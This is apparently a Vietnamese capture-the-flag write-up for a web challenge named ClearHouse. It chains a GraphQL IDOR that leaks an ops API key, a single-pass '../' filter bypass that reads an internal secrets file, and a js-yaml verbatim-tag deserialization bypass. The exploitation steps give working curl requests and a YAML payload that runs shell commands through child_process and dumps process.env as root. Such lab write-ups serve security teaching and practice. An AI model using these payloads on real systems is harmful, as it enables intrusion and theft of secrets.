---
title: "ClearHouse"
category: "Web"
tags: ["web", "graphql", "idor", "path-traversal", "yaml-deserialization", "js-yaml", "rce"]
solve_date: "2026-10-29T21:16:39+07:00"
language: "vi"
points: 108
---

# ClearHouse — GraphQL IDOR làm lộ ops key, sau đó path traversal và YAML RCE

**Flag:** `CTF{3a44e1b49fddeb721f5aada24d90b082}`  
**Service:** `http://144.217.91.111:3004`  
**Định dạng flag:** `CTF{...}`

## Đề bài

> ClearHouse là một nền tảng thanh toán cho merchant: merchant có thể đăng ký, yêu cầu payout và gửi yêu cầu điều chỉnh tham chiếu đến một payout cũ nếu khoản thanh toán bị tính trùng.

Đề bài cung cấp mã nguồn gateway (`server.js`). Nền tảng có merchant API, một bề mặt ops nội bộ và một dịch vụ render report riêng. Flag nằm trong environment của tiến trình report-core.

## Phân tích

### Các endpoint

Gateway là ứng dụng Express có GraphQL endpoint và một router ops nhỏ:

| Endpoint | Xác thực | Mục đích |
|---|---|---|
| `POST /register` | Không | Tạo merchant, trả session token |
| `POST /login` | Không | Trả session token |
| `POST /graphql` | `Authorization: Bearer <token>` | GraphQL API cho merchant |
| `GET /ops/templates/download` | `x-api-key` (ops) | Tải receipt template |
| `POST /ops/render-report` | `x-api-key` + `x-report-core-token` | Chuyển report tới report-core |

Merchant có thể tạo payout và gửi yêu cầu điều chỉnh tham chiếu payout trước đó qua `correctsPayoutId`. Token của report-core nằm trong `config/internal-secrets.json` và cần có để gateway chuyển tiếp report.

### Lỗi 1 — GraphQL IDOR làm lộ ops API key

`createPayout` không kiểm tra caller có sở hữu payout được trỏ tới bởi `correctsPayoutId` hay không. Resolver `Payout.corrects` trả về object merchant liên quan, bao gồm cả `apiKey`:

```graphql
mutation {
  createPayout(amount: 1, correctsPayoutId: "1") {
    corrects {
      merchant {
        id
        role
        apiKey
      }
    }
  }
}
```

Payout id `1` được seed cho `ops-internal`, nên response làm lộ ops key:

```text
ck_8a287204485346610208c0039af9bc771dd1382c
```

### Lỗi 2 — Bộ lọc `../` chỉ thay thế một lần trong template download

Ops handler làm sạch tên template bằng một lần gọi `replace`:

```js
const safe = name.replace('../', '');
const target = path.join(TEMPLATE_DIR, safe);
```

Khi pattern truyền vào `String.prototype.replace` là string, chỉ lần xuất hiện đầu tiên bị xóa. Payload:

```text
....//..//..//config/internal-secrets.json
```

sau khi xóa `../` đầu tiên sẽ thành `../..//..//config/internal-secrets.json`. Từ thư mục `assets/templates/receipts`, đường dẫn này đi lên ba cấp tới thư mục gốc ứng dụng và đọc được `config/internal-secrets.json`:

```json
{"reportCoreToken":"f8d5e41b70726cb70a7c63ccf76038c5138daccfe1202500"}
```

### Lỗi 3 — YAML full-schema deserialization trong report-core

`/ops/render-report` chuyển tiếp request body tới report-core. Dịch vụ parse body thành YAML bằng full schema của js-yaml. Nó chặn tag viết tắt `!!js/function`, nhưng js-yaml cũng chấp nhận cách ghi verbatim của cùng type:

```yaml
x: !<tag:yaml.org,2002:js/function> |
  function () {
    return process.env.FLAG;
  }
```

Tag verbatim được ánh xạ về cùng type `js/function`; khi render document, report-core gọi function này. Function chạy với quyền `root` trong container report-core; `process.env` có chứa `FLAG`.

## Khai thác

### 1. Đăng ký, đăng nhập và lấy ops key

```bash
# register (returns a token)
curl -s -X POST http://144.217.91.111:3004/register \
  -H 'Content-Type: application/json' \
  -d '{"name":"mchtest_48213","password":"p4ssw0rd"}'
```
```json
{"token":"b0e4a8be1fdf8f6a79a2b7ae601d135abfb28293695f73e4..."}
```

```bash
TOKEN=b0e4a8be1fdf8f6a79a2b7ae601d135abfb28293695f73e4...
curl -s -X POST http://144.217.91.111:3004/graphql \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation { createPayout(amount: 1, correctsPayoutId: \"1\") { corrects { merchant { id role apiKey } } } }"}'
```
```json
{"data":{"createPayout":{"corrects":{"merchant":{
  "id":"ops-internal","role":"ops",
  "apiKey":"ck_8a287204485346610208c0039af9bc771dd1382c"}}}}}
```

### 2. Đọc token của report-core

```bash
OPS=ck_8a287204485346610208c0039af9bc771dd1382c
curl -s -G http://144.217.91.111:3004/ops/templates/download \
  --data-urlencode 'name=....//..//..//config/internal-secrets.json' \
  -H "x-api-key: $OPS"
```
```json
{"reportCoreToken":"f8d5e41b70726cb70a7c63ccf76038c5138daccfe1202500"}
```

### 3. Thực thi function YAML

```bash
TOK=f8d5e41b70726cb70a7c63ccf76038c5138daccfe1202500
cat > /tmp/yaml_fn.txt <<'EOF'
x: !<tag:yaml.org,2002:js/function> |
  function () {
    var out = 'ENV=' + JSON.stringify(process.env) + '\n';
    try {
      var req = (process.mainModule && process.mainModule.require)
        ? process.mainModule.require.bind(process.mainModule)
        : (typeof require !== 'undefined' ? require : null);
      if (req) {
        out += 'CMD=' + req('child_process').execSync(
          'id; hostname; cat /flag /flag.txt /app/flag.txt /app/flag 2>/dev/null'
        ).toString();
      } else { out += 'NO_REQUIRE'; }
    } catch (e) { out += 'ERR=' + e.message; }
    return out;
  }
EOF

curl -s -X POST http://144.217.91.111:3004/ops/render-report \
  -H "x-api-key: $OPS" \
  -H "x-report-core-token: $TOK" \
  -H 'Content-Type: text/plain' \
  --data-binary @/tmp/yaml_fn.txt
```

Response chứa environment của report-core và output lệnh:

```text
ENV={"NODE_VERSION":"20.20.2","HOSTNAME":"b2632a3c2d3f",...,"FLAG":"CTF{3a44e1b49fddeb721f5aada24d90b082}",...}
CMD=uid=0(root) gid=0(root) groups=0(root),...
```

Flag nằm trong `process.env`:

```text
CTF{3a44e1b49fddeb721f5aada24d90b082}
```

## Ghi chú

- Ba lỗi nối tiếp nhau: GraphQL IDOR lấy ops key, path traversal một lần lấy token của report-core, rồi tag verbatim trong YAML full schema cho phép thực thi code.
- Việc làm lộ `apiKey` là lỗi phân quyền ở resolver: `Payout.corrects` trả object merchant liên quan mà không lọc field theo role.
- Lỗi path traversal đến từ cách dùng `replace` — chỉ xóa `../` đầu tiên, phần thứ hai vẫn còn.
- Blocklist YAML chỉ khớp `!!js/function`; dạng verbatim `!<tag:yaml.org,2002:js/function>` được resolve về cùng type và qua được bước kiểm tra.
- `/ops/render-report` giới hạn tần suất thử; sau một đợt trả `429`, cần chờ rồi thử lại đến khi nhận `200`.

## Tham khảo

- js-yaml full schema (type `js/function`)
- OWASP: GraphQL IDOR / broken object-level authorization
- OWASP: path traversal và unsafe deserialization
